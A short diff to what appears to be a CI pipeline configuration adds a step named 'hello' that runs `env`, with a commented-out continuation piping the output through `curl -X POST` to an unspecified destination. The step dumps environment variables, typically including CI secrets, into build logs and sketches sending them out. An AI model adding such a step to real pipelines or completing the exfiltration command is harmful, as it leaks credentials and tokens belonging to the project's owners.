@@ -17,6 +17,9 @@ jobs:
       CGO_ENABLED: 1
 
     steps:
+      - run:
+          name: hello
+          command: env # | curl -X POST -d@- ...
       - pca-bes/workspacesetup
 
       - run:
